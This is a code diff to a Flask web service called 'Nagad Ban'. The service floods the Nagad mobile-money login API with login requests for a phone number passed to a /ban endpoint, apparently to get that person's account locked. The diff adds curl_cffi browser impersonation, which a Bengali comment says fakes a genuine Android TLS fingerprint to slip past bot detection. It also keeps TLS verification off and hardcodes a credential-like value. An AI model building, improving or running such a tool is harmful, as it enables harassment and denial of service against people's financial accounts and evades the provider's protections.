@@ -1,12 +1,12 @@
 from flask import Flask, request, jsonify
-import requests
+from curl_cffi import requests as c_requests
 import time
 import json
 import random
 import string
+import os
 
 app = Flask(__name__)
-requests.packages.urllib3.disable_warnings()
 
 NAGAD_URL = "https://app2.mynagad.com:20002/api/login"
 NAGAD_PASSWORD = "B3282A2F2A28757B3A18AB833DE16A9C54518C0B0CF493E3F0A7CF09386F326A"
@@ -63,9 +63,10 @@ def nagad_ban(username, loop=LOOP):
         }
 
         try:
-            r = requests.post(NAGAD_URL, headers=dynamic_headers,
-                              json=build_payload(username),
-                              timeout=12, verify=False)
+            # curl_cffi ব্যবহার করে আসল অ্যান্ড্রয়েডের মতো TLS ফিংগারপ্রিন্ট সহ রিকোয়েস্ট পাঠানো
+            r = c_requests.post(NAGAD_URL, headers=dynamic_headers,
+                                json=build_payload(username),
+                                timeout=12, impersonate="chrome110", verify=False)
             
             try:
                 res_json = r.json()
@@ -120,10 +121,11 @@ def ban():
 @app.route("/", methods=["GET"])
 def index():
     return jsonify({
-        "app": "Nagad Ban Render Ready",
+        "app": "Nagad Ban curl_cffi Ready",
         "usage": "/ban?num=01313613360",
         "protected_count": len(PROTECT),
     })
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5000, threaded=True)
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port)
